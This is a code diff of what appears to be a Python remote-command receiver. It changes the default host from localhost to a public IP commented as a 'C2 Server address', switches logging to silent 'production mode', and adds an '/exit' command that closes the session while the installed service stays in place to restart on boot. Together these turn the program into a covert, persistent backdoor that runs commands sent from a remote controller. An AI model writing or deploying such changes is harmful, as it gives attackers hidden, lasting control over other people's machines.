@@ -12,8 +12,8 @@ import os
 import shutil
 
 # Configuration
-VERBOSE = True  # Set to False for silent operation
-DEFAULT_HOST = "127.0.0.1"  # Sender's address
+VERBOSE = False  # Set to False for silent operation (production mode)
+DEFAULT_HOST = "52.21.29.104"  # C2 Server address
 DEFAULT_PORT = 5555  # Port number
 RETRY_DELAY = 5  # Seconds between connection retries
 BUFFER_SIZE = 4096  # Socket buffer size
@@ -352,6 +352,18 @@ def start_receiver(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
 
                             # Exit completely (don't reconnect)
                             log("Service uninstalled. Exiting.")
+                            sys.exit(0)
+
+                        elif command.strip().lower() == "/exit":
+                            log("Received /exit command - exiting without uninstalling...")
+
+                            # Send acknowledgment
+                            msg = "\n[Exiting session (service will remain installed)...]\n"
+                            client_socket.sendall(msg.encode("utf-8"))
+                            client_socket.sendall(END_MARKER)
+
+                            # Exit without uninstalling (will restart on next boot)
+                            log("Exiting. Service remains installed.")
                             sys.exit(0)
 
                         log(f"$ {command}")
